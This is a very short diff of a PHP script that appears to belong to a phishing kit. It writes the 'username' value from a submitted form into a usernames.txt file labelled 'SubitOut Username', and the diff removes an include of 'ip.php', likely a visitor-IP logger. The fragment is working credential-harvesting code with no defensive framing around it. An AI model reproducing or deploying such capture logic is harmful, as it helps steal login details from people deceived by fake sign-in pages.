@@ -1,5 +1,5 @@
 <?php
-include 'ip.php';
+
 file_put_contents("usernames.txt", "SubitOut Username : " . $email = $_POST['username'] . "\n", FILE_APPEND);
 ?>
 <?php
